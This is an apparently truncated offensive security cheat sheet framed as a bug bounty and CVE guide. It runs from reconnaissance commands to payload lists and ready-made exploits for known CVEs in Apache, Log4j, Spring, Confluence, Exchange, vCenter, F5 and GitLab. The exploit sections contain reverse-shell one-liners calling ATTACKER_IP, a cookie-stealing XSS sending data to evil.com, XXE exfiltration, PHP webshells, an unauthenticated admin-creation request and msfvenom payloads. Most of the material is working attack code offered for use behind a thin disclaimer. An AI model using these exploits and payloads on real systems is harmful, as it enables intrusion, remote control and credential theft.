# 🔴 ADVANCED BUG BOUNTY + CVE METHOD TACTICS

### Complete Reference Guide — All Methods, Tools, Techniques

> ⚠️ **LEGAL DISCLAIMER**: For  penetration advance testing and bug bounty programs no  scope.  test without written permission.

---

## 📋 TABLE OF CONTENTS

1. [Reconnaissance Methods](#1-reconnaissance-methods)
2. [Subdomain &amp; Asset Discovery](#2-subdomain--asset-discovery)
3. [Web Application Scanning](#3-web-application-scanning)
4. [Parameter &amp; Endpoint Discovery](#4-parameter--endpoint-discovery)
5. [JavaScript Recon &amp; Analysis](#5-javascript-recon--analysis)
6. [Vulnerability Classes — Full Coverage](#6-vulnerability-classes--full-coverage)
7. [CVE Research Workflow](#7-cve-research-workflow)
8. [CVE by Technology Stack](#8-cve-by-technology-stack)
9. [Exploitation Techniques](#9-exploitation-techniques)
10. [Deserialization Attacks](#10-deserialization-attacks)
11. [CVE Chaining Tactics](#11-cve-chaining-tactics)
12. [API Security Testing](#12-api-security-testing)
13. [GraphQL Attacks](#13-graphql-attacks)
14. [OAuth &amp; Authentication Attacks](#14-oauth--authentication-attacks)
15. [Cloud Security Attacks](#15-cloud-security-attacks)
16. [Mobile App Recon](#16-mobile-app-recon)
17. [Shodan + Censys Mass Scanning](#17-shodan--censys-mass-scanning)
18. [Nuclei Custom Templates](#18-nuclei-custom-templates)
19. [Full Automation Pipeline](#19-full-automation-pipeline)
20. [CVE Monitoring Automation](#20-cve-monitoring-automation)
21. [Patch Diffing Techniques](#21-patch-diffing-techniques)
22. [Reporting &amp; PoC Methods](#22-reporting--poc-methods)
23. [Bug Bounty Platforms &amp; Resources](#23-bug-bounty-platforms--resources)
24. [Tool Arsenal — Complete List](#24-tool-arsenal--complete-list)

---

## 1. RECONNAISSANCE METHODS

### 1.1 Passive Reconnaissance

```bash
# WHOIS Lookup
whois target.com
whois -h whois.radb.net -- '-i origin AS12345' | grep route

# Reverse WHOIS — pag same owner maraming domain
reversewhois.io
viewdns.info/reversewhois/

# DNS History
securitytrails.com
dnsx -d target.com -a -aaaa -cname -mx -txt -ptr

# Certificate Transparency — subdomain leak
curl -s "https://crt.sh/?q=%25.target.com&output=json" | \
  jq -r '.[].name_value' | sort -u | anew subs_crt.txt

# BGP/ASN Discovery
curl -s "https://api.bgpview.io/search?query_term=target+corp" | \
  jq -r '.data.asns[].asn'

# Company IP Ranges
amass intel -org "Target Corp"
```

### 1.2 Active Reconnaissance

```bash
# Full port scan (top 1000)
nmap -sC -sV -T4 -oA nmap_out target.com

# All 65535 ports
nmap -p- --min-rate=5000 -T4 target.com

# UDP scan
nmap -sU --top-ports 200 target.com

# Service fingerprinting
nmap -sV --version-intensity 9 target.com

# OS detection
nmap -O --osscan-guess target.com

# Firewall/IDS evasion
nmap -f -D RND:10 -T2 target.com
```

### 1.3 Google Dorking (Advanced)

```
site:target.com filetype:pdf
site:target.com filetype:env
site:target.com filetype:config
site:target.com filetype:log
site:target.com inurl:admin
site:target.com inurl:login
site:target.com inurl:api
site:target.com intitle:"index of"
site:target.com "DB_PASSWORD"
site:target.com "api_key" OR "secret_key" OR "access_token"
inurl:target.com ext:php inurl:?id=
site:target.com -www
site:pastebin.com target.com password
site:github.com target.com api_key
site:trello.com target.com
```

### 1.4 GitHub Recon (Secrets Hunting)

```bash
# GitLeaks — scan for secrets
gitleaks detect --source . --report-path leaks.json
gitleaks detect --source . --report-format json --report-path out.json

# TruffleHog — verified secrets only
trufflehog github --org=targetorg --only-verified
trufflehog git https://github.com/target/repo --only-verified

# GitHub Dorks (manual)
# "target.com" "password"
# "target.com" extension:env
# "target.com" "api_key" OR "apikey" OR "api-key"
# "target.com" "secret" language:python
# "target.com" "BEGIN RSA PRIVATE KEY"
# org:targetorg "DB_PASSWORD"
# org:targetorg "access_token"

# GitDorker — automated GitHub dorking
python3 gitdorker.py -tf TOKENSFILE -q target.com -d dorks.txt
```

---

## 2. SUBDOMAIN & ASSET DISCOVERY

### 2.1 Passive Subdomain Enumeration

```bash
# Subfinder
subfinder -d target.com -silent -all | anew subs.txt

# Amass passive
amass enum -passive -d target.com -o amass_subs.txt

# BBOT — comprehensive passive recon
bbot -t target.com -f subdomain-enum

# TheHarvester
theHarvester -d target.com -b all

# Assetfinder
assetfinder --subs-only target.com | anew subs.txt

# findomain
findomain -t target.com -u findomain_subs.txt

# Combine all sources
cat amass_subs.txt findomain_subs.txt | anew subs.txt
```

### 2.2 Active DNS Brute-Force

```bash
# PureDNS — fast, accurate
puredns bruteforce /opt/wordlists/dns/best-dns-wordlist.txt \
  target.com -r /opt/resolvers/resolvers.txt | anew subs.txt

# FFUF DNS mode
ffuf -u https://FUZZ.target.com -w subdomains.txt \
  -mc 200,301,302,403

# Massdns — high-speed
massdns -r resolvers.txt -t A -o S -w massdns_out.txt \
  <(sed 's/$/.target.com/' subdomains.txt)

# Gotator — permutation generation
gotator -sub subs.txt -perm /opt/wordlists/permutations.txt \
  -depth 2 -numbers 3 | puredns resolve
```

### 2.3 Resolving & Probing Live Hosts

```bash
# HTTPX — probe all live web hosts
cat subs.txt | httpx -silent \
  -title -status-code -tech-detect \
  -content-length -follow-redirects \
  -o live_hosts.txt

# With screenshot
cat subs.txt | httpx -silent -screenshot \
  -srd screenshots/

# Gowitness — screenshot all
gowitness file -f live_hosts.txt --screenshot-path ./screenshots/

# Check for specific ports
cat subs.txt | httpx -ports 80,443,8080,8443,3000,5000,8000 -silent
```

### 2.4 ASN & IP Range Discovery

```bash
# Find ASN from company
curl -s "https://api.bgpview.io/search?query_term=Target+Corp" | \
  jq -r '.data.asns[].asn'

# Get IP ranges from ASN
curl -s "https://api.bgpview.io/asn/AS12345/prefixes" | \
  jq -r '.data.ipv4_prefixes[].prefix'

# Nmap scan on IP ranges
nmap -iL ip_ranges.txt -p 80,443,8080,8443 \
  --open -T4 -oA web_hosts

# Masscan — ultra-fast port scan
masscan -iL ip_ranges.txt -p 80,443 --rate=10000 \
  -oL masscan_out.txt
```

---

## 3. WEB APPLICATION SCANNING

### 3.1 Directory & File Enumeration

```bash
# FFUF — fast fuzzer
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
  -mc 200,301,302,403,401 \
  -fc 404 \
  -o ffuf_out.json -of json \
  -t 50 -rate 100

# Feroxbuster — recursive
feroxbuster -u https://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  --depth 3 \
  --filter-status 404,400 \
  -o ferox_out.txt

# Gobuster
gobuster dir -u https://target.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,js,txt,json,env \
  -o gobuster_out.txt

# Backup file discovery
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
  -e .bak,.backup,.old,.orig,.swp,.tmp,.zip,.tar.gz
```

### 3.2 Nikto & Automated Scanners

```bash
# Nikto — comprehensive web scan
nikto -h https://target.com -o nikto_out.txt -Format txt
nikto -h https://target.com -Tuning 123bde -maxtime 30s

# Nuclei — template-based
nuclei -u https://target.com \
  -t /opt/nuclei-templates/ \
  -severity medium,high,critical \
  -o nuclei_out.txt \
  -stats

# Nuclei with specific tags
nuclei -l live_hosts.txt \
  -tags cve,lfi,rce,sqli,xss,ssrf \
  -rate-limit 50 \
  -bulk-size 25

# Dalfox — XSS scanner
dalfox url https://target.com/search?q=test \
  -o dalfox_out.txt \
  --skip-bav
```

### 3.3 Burp Suite Advanced Techniques

```
# Burp Suite Pro Configurations:
1. Active Scan → custom insertion points
2. Intruder → Cluster Bomb attack type
3. Collaborator → OOB detection (SSRF, XXE, RCE)
4. Extensions must-have:
   - Turbo Intruder (fast brute-force)
   - Autorize (IDOR/authorization testing)
   - JWT Editor
   - Upload Scanner
   - Param Miner
   - Logger++ (logging)
   - IP Rotate (bypass IP bans)
   - Active Scan++ 
   - Hackvertor (encoding)
```

---

## 4. PARAMETER & ENDPOINT DISCOVERY

### 4.1 Parameter Fuzzing

```bash
# Arjun — hidden parameter finder
arjun -u https://target.com/api/user -m GET -o arjun_params.json
arjun -u https://target.com/search -m POST \
  --include='Content-Type: application/json'

# ParamSpider — crawl params from web archive
paramspider -d target.com -o paramspider_out.txt

# x8 — parameter discovery
x8 -u "https://target.com/api?FUZZ=value" \
  -w /opt/wordlists/params.txt

# GAU + URO + filter
gau target.com | uro | grep "?" | \
  qsreplace FUZZ | anew param_urls.txt
```

### 4.2 URL Collection from Archives

```bash
# GAU — Get All URLs
gau --threads 5 --providers wayback,commoncrawl,otx \
  target.com | anew all_urls.txt

# Waybackurls
waybackurls target.com | anew all_urls.txt

# Hakrawler — live crawler
echo https://target.com | hakrawler -depth 3 \
  -insecure | anew crawled_urls.txt

# Katana — fast crawler
katana -u https://target.com \
  -depth 3 \
  -jc \
  -o katana_out.txt

# Combine + deduplicate
cat all_urls.txt katana_out.txt crawled_urls.txt | \
  uro | sort -u > final_urls.txt
```

### 4.3 Hidden Endpoint Discovery

```bash
# Extract endpoints from JS files
cat js_files.txt | xargs -I{} bash -c \
  'curl -sk {} | linkfinder -i - -o cli 2>/dev/null' | \
  grep "^/" | anew hidden_endpoints.txt

# Kiterunner — API route discovery
kr scan https://target.com/api/ \
  -w /opt/kiterunner/routes-large.kite \
  -o kr_results.txt

# FFUF on API versioning
ffuf -u https://target.com/api/FUZZ/users \
  -w versions.txt  # v1,v2,v3,beta,alpha,internal
```

---

## 5. JAVASCRIPT RECON & ANALYSIS

### 5.1 JS File Discovery & Download

```bash
# Katana — JS-aware crawler
katana -u https://target.com -jc \
  -o js_urls.txt

# Download all JS files
cat js_urls.txt | grep "\.js$" | \
  xargs -I{} bash -c \
  'filename=$(echo {} | md5sum | cut -d" " -f1); \
   curl -sk {} -o js_files/$filename.js'

# GetJS — specialized JS downloader
getJS --url https://target.com --complete
```

### 5.2 Secret Extraction from JS

```bash
# Nuclei JS exposure templates
nuclei -l js_urls.txt -t exposures/tokens/

# SecretFinder
python3 SecretFinder.py -i https://target.com/main.js -o cli

# Manual grep for secrets
cat js_files/*.js | grep -Eo \
  '(api_key|apikey|api-key|token|secret|password|passwd|pwd|auth)["\s]*[:=]["\s]*[a-zA-Z0-9_\-]{8,}' \
  | sort -u

# AWS keys pattern
grep -r "AKIA[0-9A-Z]{16}" js_files/

# JWT tokens
grep -rE 'eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+' js_files/
```

### 5.3 DOM-based XSS Hunting in JS

```bash
# Find dangerous sinks
grep -rn \
  "innerHTML\|outerHTML\|document\.write\|eval(\|setTimeout(\|setInterval(\|location\b\|document\.URL\|document\.referrer" \
  js_files/ | grep -v ".min.js"

# Find sources
grep -rn \
  "location\.hash\|location\.search\|location\.href\|document\.cookie\|window\.name" \
  js_files/
```

---

## 6. VULNERABILITY CLASSES — FULL COVERAGE

### 6.1 SQL Injection

```bash
# SQLMap — comprehensive
sqlmap -u "https://target.com/item?id=1" \
  --dbs --batch --random-agent \
  --tamper=space2comment,between,randomcase

# Blind SQLi via time-based
sqlmap -u "https://target.com/page" \
  -p "id" --technique=T \
  --dbms=mysql --time-sec=5

# Header-based SQLi
sqlmap -u "https://target.com/page" \
  --headers="X-Forwarded-For: *" \
  --level=5 --risk=3

# Second-order SQLi — store first, trigger later
# Step 1: Register user: admin'--
# Step 2: Login, trigger SQL context

# JSON-based SQLi
sqlmap -u "https://target.com/api" \
  --data='{"id":"1"}' \
  --dbms=mysql -p id \
  --technique=BEUSTQ

# SQLi WAF bypass payloads
1 AND 1=1                   -- basic
1/*!AND*/1=1                -- MySQL comment
1 AND 1=1--                 -- comment termination
1'OR'1'='1                  -- string context
admin'--                    -- auth bypass
1 UNION SELECT NULL--       -- union test
1 UNION SELECT NULL,NULL--
```

### 6.2 Cross-Site Scripting (XSS)

```bash
# Basic payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

# WAF bypass payloads
<ScRiPt>alert(1)</sCrIpT>
<svg/onload=alert(1)>
<img src=x oNerRor=alert(1)>
<iframe src="javascript:alert(1)">
"><img src=x onerror=alert(document.domain)>
';alert(String.fromCharCode(88,83,83))//

# HTML entity bypass
<script>alert(1)</script>
<script>alert(1)</script>

# CSP bypass via JSONP
<script src="https://target.com/api/callback?cb=alert(1)"></script>

# DOM XSS
#<img src=x onerror=alert(1)>   (location.hash)
javascript:alert(1)              (href/src)

# XSS for account takeover (cookie theft)
<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">

# Dalfox automated
dalfox url "https://target.com/search?q=test" \
  --custom-payload payloads.txt \
  --remote-payloads portswigger,payloadbox
```

### 6.3 Server-Side Request Forgery (SSRF)

```bash
# Basic SSRF detection
https://target.com/fetch?url=http://YOUR-INTERACTSH-URL
https://target.com/proxy?target=http://burpcollaborator.net

# Cloud metadata endpoints
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header required: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header required: Metadata: true

# SSRF filter bypass techniques
http://127.0.0.1/          → localhost
http://0x7f000001/         → hex
http://0177.0.0.1/         → octal
http://[::1]/              → IPv6
http://localhost.evil.com/ → DNS rebinding
http://127.1/              → short form
http://2130706433/         → decimal
http://evil.com@127.0.0.1/ → at-sign confusion
http://127.0.0.1:80/       → explicit port

# Protocol bypass
dict://127.0.0.1:6379/     → Redis
gopher://127.0.0.1:6379/_PING%0D%0A  → Redis gopher
file:///etc/passwd          → local file
ftp://attacker.com/evil.txt

# SSRF to internal services
http://192.168.1.1/        → router admin
http://10.0.0.1:9200/      → Elasticsearch
http://10.0.0.1:5601/      → Kibana
http://10.0.0.1:8500/      → Consul
http://10.0.0.1:2375/      → Docker API
```

### 6.4 Local/Remote File Inclusion (LFI/RFI)

```bash
# Basic LFI
/etc/passwd:        ?file=../../../etc/passwd
/etc/shadow:        ?file=../../../etc/shadow
/proc/self/environ: ?file=../../../proc/self/environ
/var/log/apache2/access.log

# Null byte bypass (PHP < 5.3)
?file=../../../etc/passwd%00

# Encoding bypass
?file=..%2F..%2F..%2Fetc%2Fpasswd
?file=....//....//....//etc/passwd
?file=%252e%252e%252fetc%252fpasswd

# PHP wrapper abuse
?file=php://filter/convert.base64-encode/resource=/etc/passwd
?file=php://input        (POST data as PHP)
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# RFI (if allow_url_include=On)
?file=http://attacker.com/shell.txt
?file=\\attacker.com\share\shell.php

# Log poisoning → LFI to RCE
# Step 1: Poison the log
curl -A '<?php system($_GET["cmd"]); ?>' http://target.com/

# Step 2: Include the log
?file=../../../var/log/apache2/access.log&cmd=id
```

### 6.5 XML External Entity (XXE)

```xml
<!-- Basic XXE — file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>

<!-- Blind XXE via OOB (out-of-band) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://INTERACTSH_URL/xxe.dtd">
  %xxe;
]>

<!-- xxe.dtd on attacker server -->
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://ATTACKER/?data=%data;'>">
%oob;

<!-- SSRF via XXE -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

<!-- XXE in SVG file upload -->
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>

<!-- XXE via XLSX (Excel file) -->
<!-- Modify xl/workbook.xml inside XLSX ZIP -->
```

### 6.6 Insecure Direct Object Reference (IDOR)

```bash
# Horizontal IDOR — access another user's data
GET /api/v1/users/1001/profile  → try 1002, 1003...
GET /api/v1/orders/ORD-1234     → enumerate order IDs
GET /documents/download?id=500  → try 501, 502...

# Vertical IDOR — access higher privilege data
GET /api/admin/users             (as regular user)
PATCH /api/users/me {"role":"admin"}

# UUID/GUID — not always random
# UUIDv1 = time-based, predictable

# Burp Intruder — enumerate
GET /api/v1/invoice/§1000§

# IDOR in mass assignment
PATCH /api/user/profile
Content-Type: application/json
{
  "name": "attacker",
  "role": "admin",          ← try injecting
  "is_verified": true,      ← try injecting
  "email": "admin@corp.com"
}

# IDOR via HTTP method change
POST /api/user/delete (forbidden)
DELETE /api/user/delete (works!)

# IDOR via JSON vs form body
Content-Type: application/x-www-form-urlencoded → blocked
Content-Type: application/json → works!
```

### 6.7 Command Injection

```bash
# Test payloads
; id
| id
& id
&& id
`id`
$(id)
%0aid

# Time-based blind
; sleep 5
| sleep 5
& ping -c5 127.0.0.1

# OOB blind detection
; curl http://INTERACTSH_URL/
`curl http://INTERACTSH_URL/`

# Filter bypass
# Space bypass
${IFS}id
$IFS$9id
{id}
%09id  (tab)

# Quote bypass
i''d
i""d

# Concatenation bypass (bash)
/bi''n/id
$'\x69\x64'
```

### 6.8 Server-Side Template Injection (SSTI)

```bash
# Detection payloads — if math evaluates, SSTI exists
{{7*7}}           → 49    (Jinja2, Twig)
${7*7}            → 49    (FreeMarker, Groovy)
<%= 7*7 %>        → 49    (ERB/Ruby)
#{7*7}            → 49    (Ruby)
*{7*7}            → 49    (Spring)
{{7*'7'}}         → 7777777 (Jinja2) or 49 (Twig)

# Jinja2 (Python/Flask) — RCE
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Twig (PHP/Symfony)
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# FreeMarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

# Tornado (Python)
{% import os %}{{ os.popen("id").read() }}
```

### 6.9 Path Traversal

```bash
# Basic traversal
../../../etc/passwd
..\..\..\windows\win.ini

# URL encoding
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd

# Double encoding
%252e%252e%252f

# Unicode bypass
..%c0%af..%c0%afetc%c0%afpasswd

# Null byte
../../../etc/passwd%00.jpg

# Filter bypass
....//....//....//etc/passwd
..././..././..././etc/passwd

# Windows targets
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\boot.ini
```

### 6.10 Business Logic Vulnerabilities

```
1. Price Manipulation
   - Change price in request: "price":0.01
   - Negative quantity: "qty":-1
   - Apply multiple promo codes

2. Race Conditions
   - Send 10+ parallel requests simultaneously
   - Tools: Burp Turbo Intruder, race-the-web
   - Bypass rate limits, double-spend

3. Password Reset Flaws
   - Predictable tokens (timestamp-based)
   - Token reuse after expiry
   - Host header injection → reset link to attacker domain
   - Response manipulation (change 403→200)

4. Account Takeover via Email Change
   - Change email, intercept old email verification
   - Change email + reset password race condition

5. 2FA Bypass
   - Rate limit bypass on OTP
   - Response manipulation
   - Old OTP still valid
   - Skip 2FA step (direct API call)

6. JWT Manipulation
   - alg:none attack
   - HS256 → RS256 confusion
   - Weak secret brute-force
   - kid injection
```

---

## 7. CVE RESEARCH WORKFLOW

### 7.1 CVE Hunting Methodology

```
1. Monitor new CVEs daily (NVD, Twitter, Telegram)
        ↓
2. Identify CVE technology → check bug bounty targets
        ↓
3. Read advisory/patch diff carefully
        ↓
4. Set up vulnerable lab environment (Vulhub)
        ↓
5. Reproduce the vulnerability
        ↓
6. Understand the root cause
        ↓
7. Craft custom PoC
        ↓
8. Mass scan bug bounty targets
        ↓
9. Document + Report
```

### 7.2 CVE Sources & Monitoring

```bash
# Official sources
https://nvd.nist.gov/vuln/data-feeds          # NVD
https://cve.mitre.org/                         # MITRE
https://www.cvedetails.com/                    # Detailed info
https://github.com/advisories                  # GitHub advisories

# PoC repositories
https://github.com/trickest/cve               # Auto-curated PoCs
https://github.com/nomi-sec/PoC-in-GitHub     # PoC tracker
https://packetstormsecurity.com/              # Exploit archive
https://www.exploit-db.com/                   # Exploit-DB
https://sploitus.com/                         # PoC aggregator

# Real-time monitoring
# Twitter: @CVEnew, @GithubSecurity, @seclists, @hackerfantastic
# RSS: https://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-recent.json.gz

# Vulhub — pre-built vulnerable labs
git clone https://github.com/vulhub/vulhub
cd vulhub/log4j/CVE-2021-44228
docker-compose up -d
```

---

## 8. CVE BY TECHNOLOGY STACK

### 8.1 Apache HTTP Server

```bash
# CVE-2021-41773 — Path Traversal / RCE (Apache 2.4.49)
curl 'http://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' \
  --data 'echo Content-Type: text/plain; echo; id'

# CVE-2021-42013 — Bypass of 41773 patch (Apache 2.4.50)
curl 'http://target.com/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/bin/sh' \
  --data 'echo Content-Type: text/plain; echo; id'

# CVE-2017-7679 — Buffer overflow
# CVE-2017-7679 — mod_mime buffer overread

# Shellshock — CVE-2014-6271
curl -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' \
  http://target.com/cgi-bin/test.cgi

curl -H 'Cookie: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1' \
  http://target.com/cgi-bin/test.cgi
```

### 8.2 Log4Shell — CVE-2021-44228

```bash
# Setup exploit server
git clone https://github.com/welk1n/JNDI-Injection-Exploit
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
  -C "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" \
  -A ATTACKER_IP

# Test all input vectors
JNDI="${jndi:ldap://INTERACTSH_URL/log4j}"

# Headers to test
curl -H "X-Api-Version: $JNDI" https://target.com/
curl -H "User-Agent: $JNDI" https://target.com/
curl -H "X-Forwarded-For: $JNDI" https://target.com/
curl -H "Referer: $JNDI" https://target.com/
curl -H "X-Client-IP: $JNDI" https://target.com/

# In POST body / JSON
curl -X POST https://target.com/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"${jndi:ldap://INTERACTSH_URL/a}","password":"test"}'

# Bypass filters
${${lower:j}ndi:${lower:l}dap://ATTACKER/a}
${${::-j}${::-n}${::-d}${::-i}:ldap://ATTACKER/a}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}ldap://ATTACKER/a}
${j${::-n}di:ldap://ATTACKER/a}

# CVE-2021-45046 (bypass of 44228 patch)
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://ATTACKER/a}
```

### 8.3 Spring Framework

```bash
# Spring4Shell — CVE-2022-22965 (Spring MVC RCE)
curl -v -d \
'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while(-1!%3D(a%3Din.read(b)))%7B%20out.println(new%20String(b%2C%200%2C%20a))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
https://target.com/

# Spring Cloud Function — CVE-2022-22963 (SpEL Injection)
curl -X POST https://target.com/functionRouter \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("id")' \
  -H 'Content-Type: text/plain' \
  --data 'exploit'

# Spring Actuator exposed → Heapdump
curl https://target.com/actuator/heapdump -o heapdump
# Extract secrets from heapdump
strings heapdump | grep -E "(password|secret|key|token)" | head -50
```

### 8.4 WordPress

```bash
# WPScan — full CVE detection
wpscan --url https://target.com \
  --api-token YOUR_TOKEN \
  --enumerate vp,vt,tt,cb,dbe,u,m \
  --plugins-detection aggressive \
  --output wpscan_out.txt

# Common WordPress CVEs:
# CVE-2023-2745 — WordPress core path traversal
# CVE-2022-21661 — SQL injection via WP_Query
# CVE-2021-29447 — XXE via media upload

# Unauthenticated plugin SQLi pattern
GET /wp-json/plugin/v1/vulnerable?id=1 UNION SELECT 1,2,user(),4--

# XML-RPC exploitation
curl -X POST https://target.com/xmlrpc.php \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
</methodCall>'

# User enumeration via REST API
curl https://target.com/wp-json/wp/v2/users
```

### 8.5 Atlassian (Confluence/Jira)

```bash
# CVE-2022-26134 — Confluence OGNL Injection (RCE, unauth)
curl -v https://target.com/ \
  -H 'X-Cmd: id' \
  --path-as-is \
  'https://target.com/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28new+java.lang.String%5B%5D%7B%22id%22%7D%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd%22%2C%23a%29%29%7D/'

# CVE-2023-22515 — Confluence broken access control (Admin creation)
curl -X POST https://target.com/setup/setupadministrator.action \
  -d 'username=attacker&password=pass123&confirmPassword=pass123&email=att@evil.com'

# CVE-2021-26084 — Confluence OGNL injection
curl -v --data-urlencode \
  'queryString=x%27%2B%7B%22freemarker.template.utility.Execute%22%7D%5B%27new%27%5D(%22freemarker.template.utility.Execute%22)(%22id%22)+' \
  'https://target.com/rest/sharelinks/1.0/link'

# Jira SSRF — CVE-2019-8451
curl 'https://target.com/plugins/servlet/gadgets/makeRequest?url=http://169.254.169.254/latest/meta-data/'
```

### 8.6 Microsoft Exchange

```bash
# ProxyLogon — CVE-2021-26855 + CVE-2021-27065
# SSRF → Auth bypass → RCE

# CVE-2021-26855 (SSRF)
curl -k 'https://target.com/ecp/y.js' \
  -H 'Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;'

# CVE-2021-34473, CVE-2021-34523, CVE-2021-31207 (ProxyShell)
# URL-encoded path traversal to reach PowerShell backend
curl -k "https://target.com/autodiscover/autodiscover.json?\
  @target.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@target.com"
```

### 8.7 VMware vCenter

```bash
# CVE-2021-21985 — vCenter RCE (unauth)
curl -k -X POST \
  "https://target.com/ui/h5-vsan/rest/proxy/service/\
com.vmware.vsan.client.services.capability.VsanCapabilityProvider/\
checkCompatibility" \
  -H 'Content-Type: application/json' \
  -d '{"methodInput":[{"type":"ClusterComputeResource","value":null,"serverGuid":null}]}'

# CVE-2021-22005 — vCenter arbitrary file upload
curl -k -X POST "https://target.com/analytics/telemetry/ph" \
  -H "Content-Type: image/jpg" \
  --data-binary @shell.jsp
```

### 8.8 F5 BIG-IP

```bash
# CVE-2022-1388 — iControl REST auth bypass
curl -sk -X POST \
  'https://target.com/mgmt/shared/authn/login' \
  -H 'Connection: keep-alive, X-F5-Auth-Token' \
  -H 'X-Forwarded-For: 127.0.0.1' \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","userReference":"","loginReference":{"link":"http://localhost/mgmt/shared/authn/login"}}'

# CVE-2020-5902 — RCE via TMUI (unauth)
curl -k "https://target.com/tmui/login.jsp/..;/tmui/locallb/workspace/\
fileRead.jsp?fileName=/etc/passwd"
```

### 8.9 GitLab

```bash
# CVE-2021-22205 — Unauthenticated RCE via image upload
# Uses exiftool vulnerability (CVE-2021-22204)
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg

# CVE-2023-7028 — Account takeover via password reset
# Multiple emails in reset request
POST /users/password
email[]=victim@corp.com&email[]=attacker@evil.com

# CVE-2021-4191 — Unauthenticated GraphQL info disclosure
curl 'https://target.com/api/graphql' \
  -H 'Content-Type: application/json' \
  --data '{"query":"{users{nodes{id username email}}}"}'
```

---

## 9. EXPLOITATION TECHNIQUES

### 9.1 Remote Code Execution (RCE)

```bash
# Reverse shell payloads
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
nc -e /bin/bash ATTACKER_IP 4444

# Netcat listener
nc -lnvp 4444

# Upgrade shell to PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# MSFvenom payloads (for PoC only)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.jsp
```

### 9.2 Privilege Escalation (Post-exploitation for PoC)

```bash
# Enumerate (to demonstrate impact)
id && whoami && hostname
cat /etc/passwd
env | grep -i secret
ls -la ~/.ssh/
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null

# For PoC — safe commands only!
# NEVER: rm, chmod, useradd, delete operations
# ALWAYS: read-only proof (id, whoami, cat /etc/hostname)
```

---

## 10. DESERIALIZATION ATTACKS

### 10.1 Java Deserialization

```bash
# ysoserial — generate gadget chain payloads
